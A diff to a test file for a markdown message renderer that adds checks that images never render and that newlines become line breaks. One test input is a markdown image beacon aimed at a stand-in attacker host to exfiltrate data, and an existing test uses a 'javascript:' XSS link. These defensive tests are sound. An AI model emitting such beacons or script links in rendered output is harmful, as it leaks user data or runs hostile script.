@@ -31,6 +31,18 @@ describe('MarkdownMessage', () => {
     expect(html).toContain('&lt;img');
   });
 
+  it('never renders markdown images — no <img>, no network beacon (exfiltration channel)', () => {
+    const html = render('до ![схема сделки](https://attacker.example/p.gif?d=secret) после');
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('attacker.example');
+    expect(html).toContain('схема сделки'); // alt survives as plain text
+  });
+
+  it('renders a single newline as a line break (legacy replies must not flatten)', () => {
+    const html = render('Срок: 30 дней\nНеустойка: 0.5%');
+    expect(html).toContain('<br');
+  });
+
   it('sanitizes javascript: links and hardens external links', () => {
     const html = render('[кликни](javascript:alert(1)) и [сайт](https://example.com)');
     expect(html).not.toContain('javascript:');
